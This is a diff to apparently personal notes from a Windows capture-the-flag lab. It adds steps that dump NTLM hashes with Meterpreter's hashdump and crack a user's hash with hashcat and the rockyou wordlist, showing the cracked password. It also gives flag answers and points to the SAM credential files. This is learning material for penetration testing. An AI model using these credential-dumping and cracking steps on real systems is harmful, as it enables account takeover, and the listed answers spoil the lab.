@@ -1,4 +1,4 @@
-export IP=10.10.103.179
+export IP=10.10.14.213
 
 
 ==================================================
@@ -91,4 +91,41 @@ export IP=10.10.103.179
 
 [TASK 4] - Cracking
 
+1) Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
 
+	Command: 
+		> `hashdump`
+		Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+		Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+		Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+	Answer: `Jon`
+
+2) Copy this password hash to a file and research how to crack it. What is the cracked password?
+
+	Notes: 
+		Copy and pasted the Jon... hash into the file, task4.question2.hash.txt.
+		Used this link, https://www.tunnelsup.com/hash-analyzer/, to search what hashcat method to use. Found that the hash is NTLM, so -m 1000.
+	Command: 
+		> `hashcat -a 0 -m 1000 -o cracked-hash.txt task4.question2.hash.txt /usr/share/wordlists/rockyou.txt`
+		ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
+	Answer: `alqfna22`
+		
+
+==================================================
+
+[TASK 5] - Find flags!
+
+1) Flag1? (Only submit the flag contents {CONTENTS})
+
+	Notes: Found in /.
+	Answer: `access_the_machine`
+
+2) Flag2? *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.
+
+	Notes: Windows stores important information such as passwords in this file location, /Windows/System32/Config/
+	Answer: `sam_database_elevated_access`
+
+3) flag3?
+	
+	Notes: Found in /Users/Jon/Documents.
+	Answer: `admin_documents_can_be_valuable`
